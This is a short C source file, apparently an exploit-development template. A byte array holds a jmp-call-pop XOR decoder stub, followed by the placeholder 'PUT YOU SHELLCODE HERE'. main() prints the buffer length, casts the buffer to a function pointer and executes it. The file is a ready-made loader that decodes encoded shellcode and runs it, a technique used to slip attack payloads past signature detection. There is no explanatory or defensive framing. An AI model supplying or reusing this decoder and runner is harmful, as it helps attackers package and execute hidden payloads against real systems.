#include<stdio.h>
#include<string.h>
 
unsigned char code[] = "\xeb\x19\x5e\x56\x89\xf7\x8b\x06\x33\x46\x04\x3d\x90\x90\x90\x90\x74\x07\x89\x06\x83\xc6\x04\xeb\xed\xeb\x05\xe8\xe2\xff\xff\xff"
"PUT YOU SHELLCODE HERE";

void main() {
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
